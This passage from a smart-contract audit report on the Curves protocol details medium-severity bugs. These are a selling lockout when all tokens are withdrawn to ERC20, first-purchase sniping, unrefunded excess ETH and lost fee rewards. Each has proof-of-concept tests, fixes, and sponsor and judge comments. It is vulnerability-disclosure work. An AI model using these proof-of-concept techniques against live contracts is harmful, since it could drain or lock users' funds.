 > You can do it once per buy/sell cycle, as I understand. Issues related to loss of fees, and not loss of principal, are Medium.

**[andresaiello (Curves) confirmed](https://github.com/code-423n4/2024-01-curves-findings/issues/386#issuecomment-1937882375)**

***

## [[M-07] Selling will be bricked if all other tokens are withdrawn to ERC20 token](https://github.com/code-423n4/2024-01-curves-findings/issues/378)
*Submitted by [BowTiedOriole](https://github.com/code-423n4/2024-01-curves-findings/issues/378), also found by [d3e4](https://github.com/code-423n4/2024-01-curves-findings/issues/1465), [McToady](https://github.com/code-423n4/2024-01-curves-findings/issues/1282), [slylandro\_star](https://github.com/code-423n4/2024-01-curves-findings/issues/1150), [0xmystery](https://github.com/code-423n4/2024-01-curves-findings/issues/1027), [ether\_sky](https://github.com/code-423n4/2024-01-curves-findings/issues/987), [amaechieth](https://github.com/code-423n4/2024-01-curves-findings/issues/718), [0xPhantom](https://github.com/code-423n4/2024-01-curves-findings/issues/649), [wangxx2026](https://github.com/code-423n4/2024-01-curves-findings/issues/621), [nuthan2x](https://github.com/code-423n4/2024-01-curves-findings/issues/468), [zxriptor](https://github.com/code-423n4/2024-01-curves-findings/issues/416), [Bobface](https://github.com/code-423n4/2024-01-curves-findings/issues/351), [Krace](https://github.com/code-423n4/2024-01-curves-findings/issues/301), [hals](https://github.com/code-423n4/2024-01-curves-findings/issues/296), [cats](https://github.com/code-423n4/2024-01-curves-findings/issues/259), [EV\_om](https://github.com/code-423n4/2024-01-curves-findings/issues/244), and [AlexCzm](https://github.com/code-423n4/2024-01-curves-findings/issues/190)*

<https://github.com/code-423n4/2024-01-curves/blob/main/contracts/FeeSplitter.sol#L90> 

<https://github.com/code-423n4/2024-01-curves/blob/main/contracts/FeeSplitter.sol#L43-L46> 

<https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L248>

`FeeSplitter.addFees()` reverts if the `totalSupply` of the token is `0`. The total supply is calculated via the formula below:

```solidity
return (curves.curvesTokenSupply(token) - curves.curvesTokenBalance(token, address(curves))) * PRECISION;
```

Consider the following scenario:

1. Alice buys 1 Curve token to initiate herself as a token subject and withdraws her token to ERC20.
2. Bob buys 1 Curve token.
3. Charlie buys 10 Curve tokens and immediately withdraws all of them to the ERC20 contract.
4. Bob tries to sell 1 Curve token but is not able to because all other tokens are ERC20.

Bob's transaction will revert because `FeeSplitter.totalSupply()` will return `0`.

### Proof of Concept

```
it("Selling can be bricked if all other tokens are in ERC20 contract", async () => {
    await testContract.setMaxFeePercent(parseEther('.4'));
    await testContract.setProtocolFeePercent(parseEther('.1'), owner.address);
    await testContract.setExternalFeePercent(parseEther('.1'), parseEther('.1'), parseEther('.1'));

    await testContract.buyCurvesToken(owner.address, 1);
    await testContract.connect(owner).withdraw(owner.address, 1);

    await testContract.connect(friend).buyCurvesToken(owner.address, 1, { value: parseEther("1")});
    await testContract.connect(friend2).buyCurvesToken(owner.address, 5, { value: parseEther("1")});
    await testContract.connect(friend2).withdraw(owner.address, 5);

    await expect(testContract.connect(friend).sellCurvesToken(owner.address, 1)).to.be.revertedWith("NoTokenHolders()");
});
```

### Recommended Mitigation Steps

Check if the Curve contract balance matches the total supply, and if so, send the holder fee to the protocol.

```solidity
if (curvesTokenSupply[curvesTokenSubject] == curvesTokenBalance[curvesTokenSubject][address(this)]) {
    (bool success, ) = feesEconomics.protocolFeeDestination.call{value: holderFee}("");
    if (!success) revert CannotSendFunds();
} else {
    feeRedistributor.onBalanceChange(curvesTokenSubject, msg.sender);
    feeRedistributor.addFees{value: holderFee}(curvesTokenSubject);
}
```

Alternatively, you can call `_transferFees` prior to updating token balances and supply, but this will require reentrancy guards as well as other adjustments to the fee calculations.

**[andresaiello (Curves) confirmed](https://github.com/code-423n4/2024-01-curves-findings/issues/378#issuecomment-2073082025)**

***

## [[M-08] Single token purchase restriction on curve creation enables sniping](https://github.com/code-423n4/2024-01-curves-findings/issues/243)
*Submitted by [EV\_om](https://github.com/code-423n4/2024-01-curves-findings/issues/243), also found by [mrudenko](https://github.com/code-423n4/2024-01-curves-findings/issues/1335), [McToady](https://github.com/code-423n4/2024-01-curves-findings/issues/1293), [adamn000](https://github.com/code-423n4/2024-01-curves-findings/issues/1273), M3azad ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1224), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1222)), [burhan\_khaja](https://github.com/code-423n4/2024-01-curves-findings/issues/1080), [bengyles](https://github.com/code-423n4/2024-01-curves-findings/issues/995), [matejdb](https://github.com/code-423n4/2024-01-curves-findings/issues/982), [jesjupyter](https://github.com/code-423n4/2024-01-curves-findings/issues/807), [13u9](https://github.com/code-423n4/2024-01-curves-findings/issues/655), [wangxx2026](https://github.com/code-423n4/2024-01-curves-findings/issues/624), [pipidu83](https://github.com/code-423n4/2024-01-curves-findings/issues/605), [erosjohn](https://github.com/code-423n4/2024-01-curves-findings/issues/503), [eeshenggoh](https://github.com/code-423n4/2024-01-curves-findings/issues/423), [lukejohn](https://github.com/code-423n4/2024-01-curves-findings/issues/415), aslanbek ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/231), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/146)), [twcctop](https://github.com/code-423n4/2024-01-curves-findings/issues/185), [KingNFT](https://github.com/code-423n4/2024-01-curves-findings/issues/176), and [Daniel526](https://github.com/code-423n4/2024-01-curves-findings/issues/44)*

The [`getPrice()`](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L180) function in the `Curves` contract is used to calculate the price of tokens when buying or selling. However, due to the order of arguments in the `sum2` calculation within this function, subjects are restricted to buying only one token when initializing their curve.

The issue arises from the expression `(supply - 1 + amount)`, which reverts when `supply` is greater than 1. However, if the expression was `(supply + amount - 1)`, this issue would not occur. This restriction limits the functionality of the contract and makes it vulnerable to sniping on initialization and first-purchase frontrunning. This issue has spawned a small industry around friend.tech, with different companies offering [sniping bots](https://www.friendsniper.tech/) that can make instant [automatic first purchases](https://docs.friendsniper.tech/telegram-bot-overview/using-friendsniper/auto-sniper) for accounts associated with a sizeable social media presence.

```solidity
function getPrice(uint256 supply, uint256 amount) public pure returns (uint256) {    
	uint256 sum1 = supply == 0 ? 0 : ((supply - 1) * (supply) * (2 * (supply - 1) + 1)) / 6;
    uint256 sum2 = supply == 0 && amount == 1
        ? 0
        : ((supply - 1 + amount) * (supply + amount) * (2 * (supply - 1 + amount) + 1)) / 6;
    ...
}
```

Although, the issue can be mitigated in the Curves implementation by the curve subject opening a presale, it is still present for curves initialized without presale.

### Proof of Concept

1. A user with a large social media following wants to initialize a curve and buy the first 10 tokens for future use, possibly for an airdrop to her followers.
2. She does not want to create a presale and instead initializes the curve directly via `buyCurvesToken()`.
3. As soon as the curve is initialized, automated sniping bots start buying large numbers of tokens.
4. She is now forced to purchase the tokens at a much higher price and may incur losses from bots realizing their profits.

### Recommended Mitigation Steps

To resolve this issue, the order of arguments in the `sum2` calculation within the `getPrice()` function should be adjusted. Instead of `(supply - 1 + amount)`, the expression should be `(supply + amount - 1)`. This change will allow subjects to buy more than one token when initializing their curve, enhancing the contract's functionality and protecting the users.

**[andresaiello (Curves) disputed via duplicate Issue #44 and commented](https://github.com/code-423n4/2024-01-curves-findings/issues/44#issuecomment-1910818999):**
 > Reverts in the price calculation.

**[alcueca (Judge) commented](https://github.com/code-423n4/2024-01-curves-findings/issues/243#issuecomment-1942433178):**
 > I'm not convinced that the purpose of the `presales` functionality is to allow the token subject to create a presale for himself just so that he can buy more than one token (and then not being able to have a presale for other users).
> 
> If the token subject would choose to do a regular presale, using the regular community mechanisms from the NFT era, how would they ensure that they don't get a sniping bot registered for the presale?
> 
> The team might have intended to solve the issues with frontrunners, but to me it doesn't seem they succeeded.

_Note: For full discussion, see [here](https://github.com/code-423n4/2024-01-curves-findings/issues/243)._

***

## [[M-09] `Curves::_buyCurvesToken()`, Excess of Eth received is not refunded back to the user.](https://github.com/code-423n4/2024-01-curves-findings/issues/48)
*Submitted by [ravikiranweb3](https://github.com/code-423n4/2024-01-curves-findings/issues/48), also found by [btk](https://github.com/code-423n4/2024-01-curves-findings/issues/1562), ether\_sky ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1561), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1530)), 0xprinc ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1557), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1535)), [pkqs90](https://github.com/code-423n4/2024-01-curves-findings/issues/1554), [cats](https://github.com/code-423n4/2024-01-curves-findings/issues/1553), [cartlex\_](https://github.com/code-423n4/2024-01-curves-findings/issues/1547), [nuthan2x](https://github.com/code-423n4/2024-01-curves-findings/issues/1543), pep7siup ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1540), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1539)), [Prathik3](https://github.com/code-423n4/2024-01-curves-findings/issues/1534), MrPotatoMagic ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1529), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1527)), [Kose](https://github.com/code-423n4/2024-01-curves-findings/issues/1526), [peanuts](https://github.com/code-423n4/2024-01-curves-findings/issues/1521), 0xmystery ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1519), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/993)), [Ephraim](https://github.com/code-423n4/2024-01-curves-findings/issues/1512), [m4ttm](https://github.com/code-423n4/2024-01-curves-findings/issues/1454), [spark](https://github.com/code-423n4/2024-01-curves-findings/issues/1442), [0xStriker](https://github.com/code-423n4/2024-01-curves-findings/issues/1337), [emrekocak](https://github.com/code-423n4/2024-01-curves-findings/issues/1330), [SanketKogekar](https://github.com/code-423n4/2024-01-curves-findings/issues/1327), [Bjorn\_bug](https://github.com/code-423n4/2024-01-curves-findings/issues/1310), [LeoGold](https://github.com/code-423n4/2024-01-curves-findings/issues/1296), 0xlamide ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1285), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1280)), [c3phas](https://github.com/code-423n4/2024-01-curves-findings/issues/1281), [imare](https://github.com/code-423n4/2024-01-curves-findings/issues/1257), [PetarTolev](https://github.com/code-423n4/2024-01-curves-findings/issues/1242), [anshujalan](https://github.com/code-423n4/2024-01-curves-findings/issues/1239), [M3azad](https://github.com/code-423n4/2024-01-curves-findings/issues/1237), [spaghetticode\_sentinel](https://github.com/code-423n4/2024-01-curves-findings/issues/1216), [Nikki](https://github.com/code-423n4/2024-01-curves-findings/issues/1196), [Timeless](https://github.com/code-423n4/2024-01-curves-findings/issues/1183), [Varun\_05](https://github.com/code-423n4/2024-01-curves-findings/issues/1171), [negin](https://github.com/code-423n4/2024-01-curves-findings/issues/1161), [ro1sharkm](https://github.com/code-423n4/2024-01-curves-findings/issues/1148), [Night](https://github.com/code-423n4/2024-01-curves-findings/issues/1132), [tonisives](https://github.com/code-423n4/2024-01-curves-findings/issues/1106), [hihen](https://github.com/code-423n4/2024-01-curves-findings/issues/1105), [Zach\_166](https://github.com/code-423n4/2024-01-curves-findings/issues/1096), [kodyvim](https://github.com/code-423n4/2024-01-curves-findings/issues/1087), [cu5t0mpeo](https://github.com/code-423n4/2024-01-curves-findings/issues/1065), [FastChecker](https://github.com/code-423n4/2024-01-curves-findings/issues/1031), [yixxas](https://github.com/code-423n4/2024-01-curves-findings/issues/1020), [Ryonen](https://github.com/code-423n4/2024-01-curves-findings/issues/1012), [nonseodion](https://github.com/code-423n4/2024-01-curves-findings/issues/974), [ubermensch](https://github.com/code-423n4/2024-01-curves-findings/issues/957), [Tychai0s](https://github.com/code-423n4/2024-01-curves-findings/issues/926), [Silvermist](https://github.com/code-423n4/2024-01-curves-findings/issues/859), [codegpt](https://github.com/code-423n4/2024-01-curves-findings/issues/829), [grearlake](https://github.com/code-423n4/2024-01-curves-findings/issues/801), rouhsamad ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/780), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/690)), [Cosine](https://github.com/code-423n4/2024-01-curves-findings/issues/771), [HChang26](https://github.com/code-423n4/2024-01-curves-findings/issues/759), [\_eperezok](https://github.com/code-423n4/2024-01-curves-findings/issues/731), [0xblackskull](https://github.com/code-423n4/2024-01-curves-findings/issues/702), [para8956](https://github.com/code-423n4/2024-01-curves-findings/issues/675), [13u9](https://github.com/code-423n4/2024-01-curves-findings/issues/660), [Kong](https://github.com/code-423n4/2024-01-curves-findings/issues/634), [dd0x7e8](https://github.com/code-423n4/2024-01-curves-findings/issues/632), [iamandreiski](https://github.com/code-423n4/2024-01-curves-findings/issues/627), ubl4nk ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/611), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/604)), [pipidu83](https://github.com/code-423n4/2024-01-curves-findings/issues/607), [mahdirostami](https://github.com/code-423n4/2024-01-curves-findings/issues/589), [merlinboii](https://github.com/code-423n4/2024-01-curves-findings/issues/579), [dopeflamingo](https://github.com/code-423n4/2024-01-curves-findings/issues/542), [oreztker](https://github.com/code-423n4/2024-01-curves-findings/issues/520), [osmanozdemir1](https://github.com/code-423n4/2024-01-curves-findings/issues/517), [sl1](https://github.com/code-423n4/2024-01-curves-findings/issues/510), [DarkTower](https://github.com/code-423n4/2024-01-curves-findings/issues/506), [Kaysoft](https://github.com/code-423n4/2024-01-curves-findings/issues/504), [UbiquitousComputing](https://github.com/code-423n4/2024-01-curves-findings/issues/499), [zhaojohnson](https://github.com/code-423n4/2024-01-curves-findings/issues/458), [0xSwahili](https://github.com/code-423n4/2024-01-curves-findings/issues/445), [eeshenggoh](https://github.com/code-423n4/2024-01-curves-findings/issues/431), [dimulski](https://github.com/code-423n4/2024-01-curves-findings/issues/406), [SovaSlava](https://github.com/code-423n4/2024-01-curves-findings/issues/400), [BowTiedOriole](https://github.com/code-423n4/2024-01-curves-findings/issues/385), [developerjordy](https://github.com/code-423n4/2024-01-curves-findings/issues/369), [zaevlad](https://github.com/code-423n4/2024-01-curves-findings/issues/366), [Lef](https://github.com/code-423n4/2024-01-curves-findings/issues/365), [KmanOfficial](https://github.com/code-423n4/2024-01-curves-findings/issues/345), [latt1ce](https://github.com/code-423n4/2024-01-curves-findings/issues/333), [KupiaSec](https://github.com/code-423n4/2024-01-curves-findings/issues/311), [jasonxiale](https://github.com/code-423n4/2024-01-curves-findings/issues/308), hals ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/295), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/292)), [Mwendwa](https://github.com/code-423n4/2024-01-curves-findings/issues/281), [aslanbek](https://github.com/code-423n4/2024-01-curves-findings/issues/278), [ke1caM](https://github.com/code-423n4/2024-01-curves-findings/issues/268), [ZanyBonzy](https://github.com/code-423n4/2024-01-curves-findings/issues/242), [EV\_om](https://github.com/code-423n4/2024-01-curves-findings/issues/239), [cccz](https://github.com/code-423n4/2024-01-curves-findings/issues/233), [bronze\_pickaxe](https://github.com/code-423n4/2024-01-curves-findings/issues/219), [Oxsadeeq](https://github.com/code-423n4/2024-01-curves-findings/issues/207), [ktg](https://github.com/code-423n4/2024-01-curves-findings/issues/189), [twcctop](https://github.com/code-423n4/2024-01-curves-findings/issues/180), [deepplus](https://github.com/code-423n4/2024-01-curves-findings/issues/163), [Inference](https://github.com/code-423n4/2024-01-curves-findings/issues/156), [Soliditors](https://github.com/code-423n4/2024-01-curves-findings/issues/142), lil\_eth ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/132), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/123)), [Mylifechangefast\_eth](https://github.com/code-423n4/2024-01-curves-findings/issues/129), [AlexCzm](https://github.com/code-423n4/2024-01-curves-findings/issues/117), [haxatron](https://github.com/code-423n4/2024-01-curves-findings/issues/112), and [alexbabits](https://github.com/code-423n4/2024-01-curves-findings/issues/86)*

<https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L211-L216> 

<https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L263-L280>

In the `buyCurvesToken()`, the logic check for the `msg.value` to be greater than `price + fees`. This is fine, since if the price moves after the estimates was provided to the user, the above validation checks if the funds received are sufficient to proceed with the transaction.

But, at the same time, it is equally important to refund any excess eth received which is not being done.

### Proof of Concept

Refer to the below code where the validation ensures that `msg.value` is not less than `price + total` fee.

       if (msg.value < price + totalFee) revert InsufficientPayment();

But, incase any additional funds were received, the same should be returned back to the caller.

### Recommended Mitigation Steps

`uint256 excess = msg.value -  (price + totalFee)`;
if excess `> 0`,
refund the amount back to the caller.

**[andresaiello (Curves) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2024-01-curves-findings/issues/48#issuecomment-1908714174):**
 > Valid but not high severity. Friend tech does not refund in fact.

**[alcueca (Judge) decreased severity to Medium](https://github.com/code-423n4/2024-01-curves-findings/issues/48#issuecomment-1922217991)**

***

## [[M-10] `onBalanceChange` causes previously unclaimed rewards to be cleared](https://github.com/code-423n4/2024-01-curves-findings/issues/39)
*Submitted by [kutugu](https://github.com/code-423n4/2024-01-curves-findings/issues/39), also found by [0xMAKEOUTHILL](https://github.com/code-423n4/2024-01-curves-findings/issues/1556), pkqs90 ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1555), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/201)), [zxriptor](https://github.com/code-423n4/2024-01-curves-findings/issues/1545), [visualbits](https://github.com/code-423n4/2024-01-curves-findings/issues/1475), [d3e4](https://github.com/code-423n4/2024-01-curves-findings/issues/1463), [Tychai0s](https://github.com/code-423n4/2024-01-curves-findings/issues/1460), [peritoflores](https://github.com/code-423n4/2024-01-curves-findings/issues/1455), [0x0bserver](https://github.com/code-423n4/2024-01-curves-findings/issues/1414), [kuprum](https://github.com/code-423n4/2024-01-curves-findings/issues/1336), [xiao](https://github.com/code-423n4/2024-01-curves-findings/issues/1320), [dimulski](https://github.com/code-423n4/2024-01-curves-findings/issues/1302), [McToady](https://github.com/code-423n4/2024-01-curves-findings/issues/1291), [SovaSlava](https://github.com/code-423n4/2024-01-curves-findings/issues/1284), [Aymen0909](https://github.com/code-423n4/2024-01-curves-findings/issues/1247), [anshujalan](https://github.com/code-423n4/2024-01-curves-findings/issues/1162), [Zach\_166](https://github.com/code-423n4/2024-01-curves-findings/issues/1156), [rouhsamad](https://github.com/code-423n4/2024-01-curves-findings/issues/1155), [Kose](https://github.com/code-423n4/2024-01-curves-findings/issues/1152), [0xAadi](https://github.com/code-423n4/2024-01-curves-findings/issues/1131), [nonseodion](https://github.com/code-423n4/2024-01-curves-findings/issues/1122), [nazirite](https://github.com/code-423n4/2024-01-curves-findings/issues/1115), [Soul22](https://github.com/code-423n4/2024-01-curves-findings/issues/1111), [TermoHash](https://github.com/code-423n4/2024-01-curves-findings/issues/1101), ether\_sky ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1082), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1076), [3](https://github.com/code-423n4/2024-01-curves-findings/issues/992)), [whoismatthewmc1](https://github.com/code-423n4/2024-01-curves-findings/issues/1060), 0xmystery ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1059), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1005), [3](https://github.com/code-423n4/2024-01-curves-findings/issues/1002)), [HChang26](https://github.com/code-423n4/2024-01-curves-findings/issues/1034), [FastChecker](https://github.com/code-423n4/2024-01-curves-findings/issues/1032), [jacopod](https://github.com/code-423n4/2024-01-curves-findings/issues/1030), [AgileJune](https://github.com/code-423n4/2024-01-curves-findings/issues/994), matejdb ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/986), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/873)), [ubermensch](https://github.com/code-423n4/2024-01-curves-findings/issues/960), Mike\_Bello90 ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/940), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/736)), [btk](https://github.com/code-423n4/2024-01-curves-findings/issues/915), [Varun\_05](https://github.com/code-423n4/2024-01-curves-findings/issues/911), [santipu\_](https://github.com/code-423n4/2024-01-curves-findings/issues/896), [0xPhantom](https://github.com/code-423n4/2024-01-curves-findings/issues/876), [DarkTower](https://github.com/code-423n4/2024-01-curves-findings/issues/849), [codegpt](https://github.com/code-423n4/2024-01-curves-findings/issues/830), [sl1](https://github.com/code-423n4/2024-01-curves-findings/issues/820), [KingNFT](https://github.com/code-423n4/2024-01-curves-findings/issues/810), [almurhasan](https://github.com/code-423n4/2024-01-curves-findings/issues/779), [erosjohn](https://github.com/code-423n4/2024-01-curves-findings/issues/775), [Cosine](https://github.com/code-423n4/2024-01-curves-findings/issues/768), [zhaojie](https://github.com/code-423n4/2024-01-curves-findings/issues/752), [Topmark](https://github.com/code-423n4/2024-01-curves-findings/issues/694), [dd0x7e8](https://github.com/code-423n4/2024-01-curves-findings/issues/680), [UbiquitousComputing](https://github.com/code-423n4/2024-01-curves-findings/issues/650), [Lalanda](https://github.com/code-423n4/2024-01-curves-findings/issues/641), [mahdirostami](https://github.com/code-423n4/2024-01-curves-findings/issues/630), [XORs33r](https://github.com/code-423n4/2024-01-curves-findings/issues/620), [PENGUN](https://github.com/code-423n4/2024-01-curves-findings/issues/572), [jasonxiale](https://github.com/code-423n4/2024-01-curves-findings/issues/567), [pep7siup](https://github.com/code-423n4/2024-01-curves-findings/issues/559), lukejohn ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/547), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/528), [3](https://github.com/code-423n4/2024-01-curves-findings/issues/526)), [dopeflamingo](https://github.com/code-423n4/2024-01-curves-findings/issues/546), [osmanozdemir1](https://github.com/code-423n4/2024-01-curves-findings/issues/540), [spacelord47](https://github.com/code-423n4/2024-01-curves-findings/issues/533), [0xLogos](https://github.com/code-423n4/2024-01-curves-findings/issues/518), fishgang ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/490), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/488)), [alexfilippov314](https://github.com/code-423n4/2024-01-curves-findings/issues/480), [SpicyMeatball](https://github.com/code-423n4/2024-01-curves-findings/issues/466), [DanielArmstrong](https://github.com/code-423n4/2024-01-curves-findings/issues/456), [zhaojohnson](https://github.com/code-423n4/2024-01-curves-findings/issues/446), [aslanbek](https://github.com/code-423n4/2024-01-curves-findings/issues/409), [hals](https://github.com/code-423n4/2024-01-curves-findings/issues/402), [BowTiedOriole](https://github.com/code-423n4/2024-01-curves-findings/issues/382), [Bobface](https://github.com/code-423n4/2024-01-curves-findings/issues/352), [wangxx2026](https://github.com/code-423n4/2024-01-curves-findings/issues/329), [nmirchev8](https://github.com/code-423n4/2024-01-curves-findings/issues/325), [L0s1](https://github.com/code-423n4/2024-01-curves-findings/issues/318), [KupiaSec](https://github.com/code-423n4/2024-01-curves-findings/issues/316), [Oxsadeeq](https://github.com/code-423n4/2024-01-curves-findings/issues/309), [BugzyVonBuggernaut](https://github.com/code-423n4/2024-01-curves-findings/issues/304), [klau5](https://github.com/code-423n4/2024-01-curves-findings/issues/275), [ke1caM](https://github.com/code-423n4/2024-01-curves-findings/issues/265), [Soliditors](https://github.com/code-423n4/2024-01-curves-findings/issues/263), [ZanyBonzy](https://github.com/code-423n4/2024-01-curves-findings/issues/255), [EV\_om](https://github.com/code-423n4/2024-01-curves-findings/issues/245), [0x111](https://github.com/code-423n4/2024-01-curves-findings/issues/234), [cccz](https://github.com/code-423n4/2024-01-curves-findings/issues/225), [bronze\_pickaxe](https://github.com/code-423n4/2024-01-curves-findings/issues/215), [Stormreckson](https://github.com/code-423n4/2024-01-curves-findings/issues/194), [twcctop](https://github.com/code-423n4/2024-01-curves-findings/issues/183), [deepplus](https://github.com/code-423n4/2024-01-curves-findings/issues/179), Inference ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/160), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/159)), [AlexCzm](https://github.com/code-423n4/2024-01-curves-findings/issues/131), [alexbabits](https://github.com/code-423n4/2024-01-curves-findings/issues/126), [Kow](https://github.com/code-423n4/2024-01-curves-findings/issues/90), [rvierdiiev](https://github.com/code-423n4/2024-01-curves-findings/issues/66), [AS](https://github.com/code-423n4/2024-01-curves-findings/issues/42), [Krace](https://github.com/code-423n4/2024-01-curves-findings/issues/37), and haxatron ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/10), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/8))*

`onBalanceChange` does not help to claim the previous rewards, but directly resets `userFeeOffset`, causing the user's unclaimed rewards to be cleared.

### Proof of Concept

```solidity
    function testRewardLostAfterTwoPurchases1() public {
        curves.buyCurvesTokenWithName(address(this), 1, "", "");

        address attacker = makeAddr("Attacker");
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);
        curves.buyCurvesToken{value: curves.getBuyPriceAfterFee(address(this), 1)}(address(this), 1);
        console2.log(feeRedistributor.getClaimableFees(address(this), attacker));
        curves.buyCurvesToken{value: curves.getBuyPriceAfterFee(address(this), 1)}(address(this), 1);
        console2.log(feeRedistributor.getClaimableFees(address(this), attacker));
    }

    function testRewardLostAfterTwoPurchases2() public {
        curves.buyCurvesTokenWithName(address(this), 1, "", "");

        address attacker = makeAddr("Attacker");
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);
        curves.buyCurvesToken{value: curves.getBuyPriceAfterFee(address(this), 1)}(address(this), 1);
        uint256 fee1 = feeRedistributor.getClaimableFees(address(this), attacker);
        console2.log(fee1);
        feeRedistributor.claimFees(address(this));
        curves.buyCurvesToken{value: curves.getBuyPriceAfterFee(address(this), 1)}(address(this), 1);
        console2.log(fee1 + feeRedistributor.getClaimableFees(address(this), attacker));
    }
```

```shell
forge test --match-test testRewardLostAfterTwoPurchases -vvv

[PASS] testRewardLostAfterTwoPurchases1() (gas: 1287980)
Logs:
  3125000000000
  16666666666666

[PASS] testRewardLostAfterTwoPurchases2() (gas: 1303337)
Logs:
  3125000000000
  19791666666666
```

The above POC shows that when a user purchases the same token twice, the first reward is cleared.

### Tools Used

Foundry

### Recommended Mitigation Steps

`onBalanceChange` should claim the previous rewards, and then resets `userFeeOffset`:

```diff
diff --git a/contracts/FeeSplitter.sol b/contracts/FeeSplitter.sol
index bb24f02..9751902 100644
--- a/contracts/FeeSplitter.sol
+++ b/contracts/FeeSplitter.sol
@@ -66,8 +66,8 @@ contract FeeSplitter is Security {
         if (balance > 0) {
             uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[account]) * balance;
             data.unclaimedFees[account] += owed / PRECISION;
-            data.userFeeOffset[account] = data.cumulativeFeePerToken;
         }
+        data.userFeeOffset[account] = data.cumulativeFeePerToken;
     }
 
     function getClaimableFees(address token, address account) public view returns (uint256) {
@@ -94,8 +94,7 @@ contract FeeSplitter is Security {
     }
 
     function onBalanceChange(address token, address account) public onlyManager {
-        TokenData storage data = tokensData[token];
-        data.userFeeOffset[account] = data.cumulativeFeePerToken;
+        updateFeeCredit(token, account);
         if (balanceOf(token, account) > 0) userTokens[account].push(token);
     }
```

**[andresaiello (Curves) confirmed](https://github.com/code-423n4/2024-01-curves-findings/issues/39#issuecomment-1908724471)**

**[alcueca (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-curves-findings/issues/39#issuecomment-1938128356):**
 > Loss of fees or rewards is Medium.

***
# Low Risk and Non-Critical Issues

For this audit, 113 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2024-01-curves-findings/issues/1357) by **0xmystery** received the top score from the judge.

*The following wardens also submitted reports: [mrudenko](https://github.com/code-423n4/2024-01-curves-findings/issues/1432), [cheatc0d3](https://github.com/code-423n4/2024-01-curves-findings/issues/1390), [0xStriker](https://github.com/code-423n4/2024-01-curves-findings/issues/1338), [McToady](https://github.com/code-423n4/2024-01-curves-findings/issues/1301), [DarkTower](https://github.com/code-423n4/2024-01-curves-findings/issues/1300), [XORs33r](https://github.com/code-423n4/2024-01-curves-findings/issues/1276), [MrPotatoMagic](https://github.com/code-423n4/2024-01-curves-findings/issues/1230), [grearlake](https://github.com/code-423n4/2024-01-curves-findings/issues/1206), [slvDev](https://github.com/code-423n4/2024-01-curves-findings/issues/1195), [7ashraf](https://github.com/code-423n4/2024-01-curves-findings/issues/1141), [ether\_sky](https://github.com/code-423n4/2024-01-curves-findings/issues/1088), [0xStalin](https://github.com/code-423n4/2024-01-curves-findings/issues/1072), [0xGreyWolf](https://github.com/code-423n4/2024-01-curves-findings/issues/1049), [erebus](https://github.com/code-423n4/2024-01-curves-findings/issues/988), [lsaudit](https://github.com/code-423n4/2024-01-curves-findings/issues/949), [btk](https://github.com/code-423n4/2024-01-curves-findings/issues/913), [0x111](https://github.com/code-423n4/2024-01-curves-findings/issues/856), [Prathik3](https://github.com/code-423n4/2024-01-curves-findings/issues/842), [Cosine](https://github.com/code-423n4/2024-01-curves-findings/issues/764), [\_eperezok](https://github.com/code-423n4/2024-01-curves-findings/issues/735), [UbiquitousComputing](https://github.com/code-423n4/2024-01-curves-findings/issues/651), [jasonxiale](https://github.com/code-423n4/2024-01-curves-findings/issues/603), [merlinboii](https://github.com/code-423n4/2024-01-curves-findings/issues/582), [osmanozdemir1](https://github.com/code-423n4/2024-01-curves-findings/issues/548), [dd0x7e8](https://github.com/code-423n4/2024-01-curves-findings/issues/524), [alexfilippov314](https://github.com/code-423n4/2024-01-curves-findings/issues/487), [lukejohn](https://github.com/code-423n4/2024-01-curves-findings/issues/420), 